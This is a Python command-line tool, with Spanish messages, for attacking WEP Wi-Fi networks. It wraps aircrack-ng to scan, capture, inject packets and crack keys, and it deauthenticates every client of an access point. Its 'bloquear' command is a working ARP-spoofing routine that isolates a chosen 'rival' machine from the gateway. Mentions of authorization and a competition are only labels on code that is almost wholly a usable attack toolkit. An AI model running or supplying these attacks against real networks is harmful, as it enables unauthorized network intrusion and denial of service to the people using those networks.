#!/usr/bin/env python3
"""Ayuda mínima para captura WEP autorizada y recuperación sin diccionario."""

import argparse
import fcntl
import os
from pathlib import Path
import platform
import re
import shlex
import shutil
import socket
import struct
import subprocess
import time


def bssid(value):
    if not re.fullmatch(r"(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", value):
        raise argparse.ArgumentTypeError("BSSID inválido; usa AA:BB:CC:DD:EE:FF")
    raw = bytes.fromhex(value.replace(":", ""))
    if raw[0] & 1 or raw == bytes(6):
        raise argparse.ArgumentTypeError("se requiere un BSSID unicast no nulo")
    return value.upper()


def interfaz(value):
    if not re.fullmatch(r"[a-zA-Z0-9_][a-zA-Z0-9_.-]{0,14}", value):
        raise argparse.ArgumentTypeError("nombre de interfaz inválido")
    return value


def canal(value):
    try:
        number = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError("el canal debe ser un entero") from None
    if not 1 <= number <= 196:
        raise argparse.ArgumentTypeError("el canal debe estar entre 1 y 196")
    return str(number)


def rafagas(value):
    try:
        number = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError("la cantidad debe ser un entero") from None
    if not 0 <= number <= 65535:
        raise argparse.ArgumentTypeError("la cantidad debe estar entre 0 y 65535 (0 = continuo)")
    return str(number)


def ipv4(value):
    match = re.fullmatch(r"(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})", value)
    if not match or any(int(octet) > 255 for octet in match.groups()):
        raise argparse.ArgumentTypeError("dirección IPv4 inválida")
    return value


def segundos(value):
    try:
        number = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError("el intervalo debe ser un entero") from None
    if not 1 <= number <= 60:
        raise argparse.ArgumentTypeError("el intervalo debe estar entre 1 y 60 segundos")
    return number


def parser():
    result = argparse.ArgumentParser(description=__doc__)
    commands = result.add_subparsers(dest="accion", required=True)
    commands.add_parser("comprobar", help="diagnóstico local, sin escanear redes")
    monitor = commands.add_parser("monitor", help="activa o detiene el modo monitor")
    monitor.add_argument("--interfaz", required=True, type=interfaz)
    monitor.add_argument("--canal", type=canal,
                         help="fija el canal al activar; se ignora con --detener")
    monitor.add_argument("--detener", action="store_true",
                         help="detiene el modo monitor en lugar de activarlo")
    scan = commands.add_parser("escanear", help="lista APs WEP para hallar BSSID/canal")
    scan.add_argument("--interfaz", required=True, type=interfaz)
    scan.add_argument("--canal", type=canal, help="limita el escaneo a un canal")
    scan.add_argument("--salida", help="guarda el escaneo en esta ruta (pcap+csv)")
    inject = commands.add_parser("inyectar",
                                 help="genera IVs contra el AP autorizado para crackear antes")
    inject.add_argument("--interfaz", required=True, type=interfaz)
    inject.add_argument("--bssid", required=True, type=bssid)
    inject.add_argument("--mac", type=bssid,
                        help="MAC de origen (tu adaptador); necesaria para asociarte")
    inject.add_argument("--modo",
                        choices=("arpreplay", "chopchop", "fragment", "fakeauth"),
                        default="arpreplay",
                        help="arpreplay/chopchop/fragment generan IVs aun con poco tráfico; "
                             "fakeauth asocia tu adaptador al AP")
    deauth = commands.add_parser("deauth",
                                 help="desautentica clientes del AP autorizado (competencia)")
    deauth.add_argument("--interfaz", required=True, type=interfaz)
    deauth.add_argument("--bssid", required=True, type=bssid)
    deauth.add_argument("--cliente", type=bssid,
                        help="MAC de un cliente concreto; sin ella afecta a todos los del AP")
    deauth.add_argument("--cantidad", default="10", type=rafagas,
                        help="número de ráfagas (0 = continuo); por defecto 10")
    block = commands.add_parser("bloquear",
                                help="aísla a un rival de la red con ARP spoofing (necesita la clave)")
    block.add_argument("--interfaz", required=True, type=interfaz,
                       help="interfaz YA conectada a la red WEP (gestionada, con IP); no la de monitor")
    block.add_argument("--objetivo", required=True, type=ipv4, help="IP del rival a aislar")
    block.add_argument("--gateway", required=True, type=ipv4, help="IP del router/gateway")
    block.add_argument("--intervalo", default=2, type=segundos,
                       help="segundos entre refrescos de ARP (1-60); por defecto 2")
    capture = commands.add_parser("capturar", help="captura pasiva del AP autorizado")
    capture.add_argument("--interfaz", required=True, type=interfaz)
    capture.add_argument("--bssid", required=True, type=bssid)
    capture.add_argument("--canal", required=True, type=canal)
    capture.add_argument("--salida", default="capturas/captura")
    recover = commands.add_parser("recuperar", help="analiza un archivo WEP, sin transmitir")
    recover.add_argument("captura", type=Path)
    recover.add_argument("--bssid", required=True, type=bssid)
    recover.add_argument("--clave", default="capturas/clave.txt")
    for command in (monitor, scan, inject, deauth, block, capture, recover):
        command.add_argument("--simular", action="store_true",
                             help="valida argumentos y muestra el comando sin ejecutarlo")
    return result


def comprobar():
    print("Sistema:", platform.platform())
    tools = ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "iw")
    missing = []
    for name in tools:
        path = shutil.which(name)
        print(f"{name}: {path or 'NO INSTALADO'}")
        if not path:
            missing.append(name)
    wireless = sorted(p.name for p in Path("/sys/class/net").glob("*")
                      if (p / "wireless").exists() or (p / "phy80211").exists())
    print("Interfaces Wi-Fi visibles:", ", ".join(wireless) or "ninguna detectada")
    print("Modo monitor e inyección: requieren comprobar el adaptador físico en Linux.")
    return int(bool(missing) or not wireless)


def _iface_mac(iface):
    return Path(f"/sys/class/net/{iface}/address").read_text().strip()


def _iface_ip(iface):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        packed = struct.pack("256s", iface.encode()[:15])
        return socket.inet_ntoa(fcntl.ioctl(sock.fileno(), 0x8915, packed)[20:24])


def _arp_frame(src_mac, dst_mac, op, sender_ip, sender_mac, target_ip, target_mac):
    ethernet = bytes.fromhex(dst_mac.replace(":", "")) + \
        bytes.fromhex(src_mac.replace(":", "")) + b"\x08\x06"
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op)
    arp += bytes.fromhex(sender_mac.replace(":", "")) + socket.inet_aton(sender_ip)
    arp += bytes.fromhex(target_mac.replace(":", "")) + socket.inet_aton(target_ip)
    return ethernet + arp


def _resolve(sock, my_mac, my_ip, target_ip, timeout=3):
    broadcast, nulo = "ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"
    sock.send(_arp_frame(my_mac, broadcast, 1, my_ip, my_mac, target_ip, nulo))
    sock.settimeout(timeout)
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            frame = sock.recv(65535)
        except socket.timeout:
            break
        if len(frame) < 42 or frame[12:14] != b"\x08\x06" or frame[20:22] != b"\x00\x02":
            continue
        if socket.inet_ntoa(frame[28:32]) == target_ip:
            return ":".join(f"{byte:02x}" for byte in frame[22:28])
    return None


def bloquear(args, cli):
    if args.simular:
        print(f"bloquear: aislaría {args.objetivo} del gateway {args.gateway} por ARP spoofing "
              f"en {args.interfaz} (sin reenvío = sin acceso)", flush=True)
        return 0
    if os.geteuid() != 0:
        cli.error("bloquear requiere privilegios de root (usa sudo)")
    try:
        my_mac = _iface_mac(args.interfaz)
        my_ip = _iface_ip(args.interfaz)
    except OSError as error:
        cli.error(f"{args.interfaz} no está conectada a la red WEP: {error}")
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((args.interfaz, 0))
    except OSError as error:
        cli.error(f"no se pudo abrir el socket en {args.interfaz}: {error}")
    victim_mac = _resolve(sock, my_mac, my_ip, args.objetivo)
    gateway_mac = _resolve(sock, my_mac, my_ip, args.gateway)
    if not victim_mac or not gateway_mac:
        cli.error("no se resolvió la MAC del objetivo o del gateway (¿están en línea?)")
    print(f"Aislando {args.objetivo} ({victim_mac}) del gateway {args.gateway} "
          f"({gateway_mac}); Ctrl-C para restaurar.", flush=True)
    try:
        while True:
            sock.send(_arp_frame(my_mac, victim_mac, 2, args.gateway, my_mac,
                                 args.objetivo, victim_mac))
            sock.send(_arp_frame(my_mac, gateway_mac, 2, args.objetivo, my_mac,
                                 args.gateway, gateway_mac))
            time.sleep(args.intervalo)
    except KeyboardInterrupt:
        for _ in range(3):
            sock.send(_arp_frame(gateway_mac, victim_mac, 2, args.gateway, gateway_mac,
                                 args.objetivo, victim_mac))
            sock.send(_arp_frame(victim_mac, gateway_mac, 2, args.objetivo, victim_mac,
                                 args.gateway, gateway_mac))
        print("\nARP restaurado.", flush=True)
        return 130


def main(argv=None):
    cli = parser()
    args = cli.parse_args(argv)
    if args.accion == "comprobar":
        return comprobar()
    if args.accion == "bloquear":
        return bloquear(args, cli)
    output = None
    if args.accion == "monitor":
        if args.detener:
            command = ["airmon-ng", "stop", args.interfaz]
        else:
            command = ["airmon-ng", "start", args.interfaz]
            if args.canal:
                command.append(args.canal)
    elif args.accion == "escanear":
        command = ["airodump-ng", "--encrypt", "WEP"]
        if args.canal:
            command += ["--channel", args.canal]
        if args.salida:
            output = Path(args.salida).resolve()
            command += ["--write", str(output), "--output-format", "pcap,csv"]
        command.append(args.interfaz)
    elif args.accion == "inyectar":
        flags = {"arpreplay": ["--arpreplay", "-b", args.bssid],
                 "chopchop": ["--chopchop", "-b", args.bssid],
                 "fragment": ["--fragment", "-b", args.bssid],
                 "fakeauth": ["--fakeauth", "0", "-a", args.bssid]}
        command = ["aireplay-ng", *flags[args.modo]]
        if args.mac:
            command += ["-h", args.mac]
        command.append(args.interfaz)
    elif args.accion == "deauth":
        command = ["aireplay-ng", "--deauth", args.cantidad, "-a", args.bssid]
        if args.cliente:
            command += ["-c", args.cliente]
        command.append(args.interfaz)
    elif args.accion == "capturar":
        output = Path(args.salida).resolve()
        command = ["airodump-ng", "--bssid", args.bssid, "--channel", args.canal,
                   "--encrypt", "WEP", "--write", str(output),
                   "--output-format", "pcap,csv", args.interfaz]
    else:
        if not args.captura.is_file():
            cli.error(f"no existe el archivo de captura: {args.captura}")
        output = Path(args.clave).resolve()
        if output.exists():
            cli.error(f"la salida de clave ya existe; usa otra ruta: {output}")
        command = ["aircrack-ng", "-a", "1", "-b", args.bssid,
                   "-l", str(output), str(args.captura.resolve())]
    print(shlex.join(command), flush=True)
    if args.simular:
        return 0
    if not shutil.which(command[0]):
        cli.error(f"falta {command[0]}; instala aircrack-ng")
    if output is not None:
        output.parent.mkdir(parents=True, exist_ok=True)
    try:
        return subprocess.call(command)
    except KeyboardInterrupt:
        return 130
    except OSError as error:
        cli.error(str(error))


if __name__ == "__main__":
    raise SystemExit(main())
